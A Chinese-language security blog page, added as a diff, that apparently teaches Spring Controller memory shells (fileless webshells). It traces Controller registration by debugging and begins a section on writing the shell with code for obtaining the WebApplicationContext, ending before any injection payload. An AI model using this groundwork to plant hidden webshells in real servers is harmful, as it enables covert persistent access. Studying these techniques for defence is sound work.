@@ -1,0 +1,1195 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/0-11-%E6%AC%A7%E6%B6%A6%E5%90%89.png">
+  <link rel="icon" href="/img/0-11-%E6%AC%A7%E6%B6%A6%E5%90%89.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="linear-gradient(270deg, rgba(107,115,255,0.85), rgba(65,80,220,0.85), rgba(0,180,240,0.85), rgba(60,200,255,0.85), rgba(120,220,255,0.85), rgba(180,120,255,0.85), rgba(220,100,255,0.85), rgba(255,110,230,0.85), rgba(140,100,255,0.85), rgba(100,150,255,0.85), rgba(70,200,220,0.85), rgba(107,115,255,0.85))">
+  <meta name="author" content="Xvsf">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Java 内存马第三篇 - Spring 内存马">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java 内存马第三篇 - Spring 内存马">
+<meta property="og:url" content="http://xvshifu.github.io/2025/11/08/Java%20%E5%86%85%E5%AD%98%E9%A9%AC%E7%AC%AC%E4%B8%89%E7%AF%87%20-%20Spring%20%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
+<meta property="og:site_name" content="Xvsf blogs">
+<meta property="og:description" content="Java 内存马第三篇 - Spring 内存马">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518532.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081519388.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081519690.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081519797.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518537.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518563.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518762.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081519846.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518317.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081519676.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081519550.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518045.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518054.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081519356.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518642.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518920.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518356.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081520106.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518461.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081520959.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081520985.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518416.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518826.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518808.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518516.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518492.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518947.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518183.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081520466.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518085.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081520006.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518686.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518278.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518820.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081521460.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518126.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518756.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081521545.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518383.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518441.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518658.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518094.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081521076.png">
+<meta property="article:published_time" content="2025-11-08T07:02:00.000Z">
+<meta property="article:modified_time" content="2025-11-08T07:29:27.187Z">
+<meta property="article:author" content="Xvsf">
+<meta property="article:tag" content="java安全">
+<meta property="article:tag" content="内存马">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518532.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Java 内存马第三篇 - Spring 内存马 - Xvsf blogs</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/xm_custom/custom.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xvshifu.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"0wmNTqqCOUst92FKToSXxgvQ-gzGzoHsz","app_key":"p527aBaA4G01EJdMOVMGXsHR","server_url":"https://0wmntqqc.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>🖋️ Hello My Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-steam"></i>
+                <span>game</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/mf" target="_self">
+                    
+                    <span>魔方</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/sl" target="_self">
+                    
+                    <span>扫雷</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/2048" target="_self">
+                    
+                    <span>2048</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/wzq" target="_self">
+                    
+                    <span>五子棋</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/txz" target="_self">
+                    
+                    <span>推箱子</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/dblk" target="_self">
+                    
+                    <span>躲避绿块</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/catch-the-cat-master" target="_self">
+                    
+                    <span>围住小猫</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/clock/0" target="_self">
+                    
+                    <span>时钟1</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/clock/1" target="_self">
+                    
+                    <span>时钟2</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/banner02.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Java 内存马第三篇 - Spring 内存马"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-11-08 15:02" pubdate>
+          2025年11月8日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          37 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Java 内存马第三篇 - Spring 内存马</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2025年11月8日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Java-内存马第三篇-Spring-内存马"><a href="#Java-内存马第三篇-Spring-内存马" class="headerlink" title="Java 内存马第三篇 - Spring 内存马"></a>Java 内存马第三篇 - Spring 内存马</h1><h1 id="三、Spring-内存马"><a href="#三、Spring-内存马" class="headerlink" title="三、Spring 内存马"></a>三、Spring 内存马</h1><h2 id="1、Controller-内存马"><a href="#1、Controller-内存马" class="headerlink" title="1、Controller 内存马"></a>1、Controller 内存马</h2><h3 id="一些基础知识："><a href="#一些基础知识：" class="headerlink" title="一些基础知识："></a>一些基础知识：</h3><h4 id="Bean"><a href="#Bean" class="headerlink" title="Bean"></a>Bean</h4><p><code>Bean</code> 是 Spring 框架的一个<strong>核心概念</strong>，它是构成应用程序的主干，并且是由 <code>Spring IoC</code> 容器负责实例化、配置、组装和管理的对象。</p>
+<ul>
+<li>bean 是对象</li>
+<li>bean 被 IoC 容器管理</li>
+<li>Spring 应用主要是由一个个的 bean 构成的</li>
+</ul>
+<h4 id="IOC容器"><a href="#IOC容器" class="headerlink" title="IOC容器"></a>IOC容器</h4><p>如果一个系统有大量的组件（类），其生命周期和相互之间的依赖关系如果由组件自身来维护，不但大大增加了系统的复杂度，而且会导致组件之间极为紧密的耦合，继而给测试和维护带来了极大的困难。解决这一问题的核心方案就是IoC（又称为依赖注入）。由IoC负责创建组件、根据依赖关系组装组件、按依赖顺序正确销毁组件。</p>
+<p>IOC容器通过读取配置元数据来获取对象的实例化、配置和组装的描述信息。配置的零元数据可以用<code>xml</code>、<code>Java注解</code>或<code>Java代码</code>来表示。</p>
+<h4 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h4><p>Spring 框架中，<code>BeanFactory</code> 接口是 <code>Spring</code> <strong>IoC容器</strong> 的实际代表者</p>
+<p>Spring容器就是ApplicationContext，它是一个接口继承于BeanFactory，有很多实现类。获得了ApplicationContext的实例，就获得了IoC容器的引用。我们可以从ApplicationContext中可以根据Bean的ID获取Bean。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518532.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>因此，<code>org.springframework.context.ApplicationContext</code>接口也代表了 <code>IoC容器</code> ，它负责实例化、定位、配置应用程序中的对象(<code>bean</code>)及建立这些对象间(<code>beans</code>)的依赖。</p>
+<h3 id="1-1-Controller-创建"><a href="#1-1-Controller-创建" class="headerlink" title="1.1 Controller 创建"></a>1.1 Controller 创建</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081519388.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081519690.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081519797.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>SpringController.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.springmem.demos.web;<br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringController</span> &#123;<br><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello world&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518537.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h3 id="1-2-Controller-注册流程"><a href="#1-2-Controller-注册流程" class="headerlink" title="1.2 Controller 注册流程"></a>1.2 Controller 注册流程</h3><p>之前学习的 servlet、filter、listener 等都是通过访问特定路由来访问上传的内存马，那么在 Spring 中直观体现路由逻辑的就是 Controller。</p>
+<p><strong>核心请求链路:</strong></p>
+<p>当访问 <code>http://127.0.0.1:8098/hello</code> 时，请求经过以下关键步骤：</p>
+<ol>
+<li>Servlet 容器层：请求先经过 Tomcat 内置容器的 Filter 链（如 <code>WsFilter</code>、<code>RequestContextFilter</code>）</li>
+<li>Spring MVC 入口：进入 <code>DispatcherServlet</code>（Spring MVC 核心前端控制器）</li>
+<li>请求分发：<code>DispatcherServlet.doDispatch()</code> 方法负责请求分发，核心逻辑是「找到匹配的 Controller 方法」</li>
+<li>Handler 映射：通过 <code>getHandler()</code> 方法遍历 <code>handlerMappings</code> 列表，找到能处理 <code>/index</code> 路径的映射器</li>
+<li>方法执行：调用匹配的 Controller 方法（<code>MyController.index()</code>），返回响应结果</li>
+</ol>
+<p>断点调试，分析 Controller 的注册流程</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518563.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><code>doDispatch</code> 函数通常出现在基于 Spring MVC 框架的 Java Web 应用程序中，它是 <code>DispatcherServlet</code> 类的一个方法。<code>DispatcherServlet</code> 是 Spring MVC 中的核心控制器（前端控制器），负责接收所有的 HTTP 请求，并根据请求映射（通常是通过注解或 XML 配置）来决定应该调用哪个控制器（Controller）来处理这个请求。<br>具体来说，<code>doDispatch</code> 方法的主要职责包括：</p>
+<ol>
+<li><strong>解析请求</strong>：从传入的 HTTP 请求中提取必要的信息，比如请求路径、请求方法等。</li>
+<li><strong>查找处理器</strong>：使用处理器映射（HandlerMapping）机制来找到能够处理当前请求的处理器对象（即 Controller 中的方法）。这一步骤涉及将 URL 路径与已注册的处理器进行匹配。</li>
+<li><strong>创建处理器适配器</strong>：一旦找到了合适的处理器，就会通过处理器适配器（HandlerAdapter）来调用该处理器。处理器适配器负责执行具体的控制逻辑，并返回一个模型视图对象（ModelAndView）。</li>
+<li><strong>渲染响应</strong>：基于处理器返回的模型视图对象，选择合适的视图解析器（ViewResolver）来生成最终的响应内容。这可能涉及到从数据库获取数据、调用业务逻辑服务等操作。</li>
+<li><strong>处理异常</strong>：如果在上述过程中发生任何异常，<code>doDispatch</code> 也会负责捕获这些异常并通过适当的异常解析器（ExceptionResolver）来处理它们，确保应用程序能够优雅地应对错误情况并给客户端返回有意义的信息。</li>
+</ol>
+<p>总之，<code>doDispatch</code> 在 Spring MVC 的工作流程中扮演了极其重要的角色，它协调了从接收到请求到产生响应的整个过程，是实现松耦合且可扩展Web应用的关键部分之一。</p>
+<p>我们从 doDispatch 开始看</p>
+<p>访问 &#x2F;hello 路由时，首先要进入到 getHandler()</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518762.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081519846.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>getHandler() 中有一个 HandlerMappings，HandlerMappings 中存在 5 个HandlerMapping ,</p>
+<p>通过这五个来确定当前请求的处理程序</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518317.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>&#x2F;&#x2F;Determine handler adapter for the current request.	确定当前请求的处理程序适配器。</p>
+<p>HandlerAdapter ha &#x3D; getHandlerAdapter(mappedHandler.getHandler());</p>
+<p>通过 <code>HandlerMapping</code> 找到 <code>Handler</code>，<code>**getHandlerAdapter(mappedHandler.getHandler())**</code> <strong>：根据找到的</strong><code>**Handler**</code><strong>的类型，找到能处理它的</strong> <code>**HandlerAdapter**</code><strong>。</strong></p>
+<p>在这一过程中，选择了适配器进行处理</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081519676.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>继续往下，这一步时实际处理 handler 的</p>
+<p>&#x2F;&#x2F;Actually invoke the handler.</p>
+<p>mv &#x3D; ha.handle(processedRequest, response, mappedHandler.getHandler());</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081519550.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><strong>现在需要返回到 mappedHandler &#x3D; getHandler(processedRequest);</strong><br>在这一步中，会进入 getHandler() </p>
+<p>​	</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518045.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>最终会来到： getHandlerInternal() 方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518054.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>而其中的 mappingRegistry 中存放着我们的路由信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081519356.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>这里首先对<code>mappingRegistry</code>进行上锁，最后在 finally 块中，进行解锁，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518642.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>在 lookupPath 中获取了我们访问的路由	</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518920.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><strong>接下来分析一下它的注册流程：</strong></p>
+<p>在 AbstractHandlerMethodMapping.initHandlerMethods 处下断点调试</p>
+<p>initHandlerMethods 方法扫描 ApplicationContext 中的 bean，检测和注册处理程序方法</p>
+<p>使用<code>processCandidateBean</code>方法中来处理bean</p>
+<p>断点要让他运行直到获得我们需要的 SpringController</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518356.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>进入 processCandidateBean 方法</p>
+<p>首先通过 getType() 获取到了 beanType</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081520106.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>判断该Bean是否为<code>Handler</code>对象，如果是的话，就将其传入<code>detectHandlerMethods</code>方法中</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518461.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>getUserClass  获取类名</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081520959.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>获取方法名</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081520985.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>registerHandlerMethod 执行注册操作</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518416.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518826.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h3 id="1-3-内存马编写"><a href="#1-3-内存马编写" class="headerlink" title="1.3 内存马编写"></a>1.3 内存马编写</h3><h4 id="1-3-1-获取上下文"><a href="#1-3-1-获取上下文" class="headerlink" title="1.3.1 获取上下文"></a>1.3.1 获取上下文</h4><p>对于内存马的注入，最重要的事情就是获取上下文，在Tomcat中获取说的上下文为<code>StandardContext</code>，对于Spring获取的就是<code>WebApplicationContext</code>。</p>
+<p>五种方法：</p>
+<ol>
+<li>ContextLoader</li>
+<li>WebApplicationContextUtils</li>
+<li>RequestContextUtils</li>
+<li>getAttribute</li>
+<li>反射获取</li>
+</ol>
+<h5 id="ContextLoader"><a href="#ContextLoader" class="headerlink" title="ContextLoader"></a><strong>ContextLoader</strong></h5><p><code>getCurrentWebApplicationContext</code> 获得的是一个 <code>XmlWebApplicationContext</code> 实例类型的 <code>Root WebApplicationContext</code>。  </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> ContextLoader.getCurrentWebApplicationContext();<br></code></pre></td></tr></table></figure>
+
+
+
+<h5 id="WebApplicationContextUtils"><a href="#WebApplicationContextUtils" class="headerlink" title="WebApplicationContextUtils"></a>WebApplicationContextUtils</h5><p>通过这种方法获得的也是一个 <code>Root WebApplicationContext</code>。其中 <code>WebApplicationContextUtils.getWebApplicationContext</code> 函数也可以用 <code>WebApplicationContextUtils.getRequiredWebApplicationContext</code>来替换。  </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());<br></code></pre></td></tr></table></figure>
+
+
+
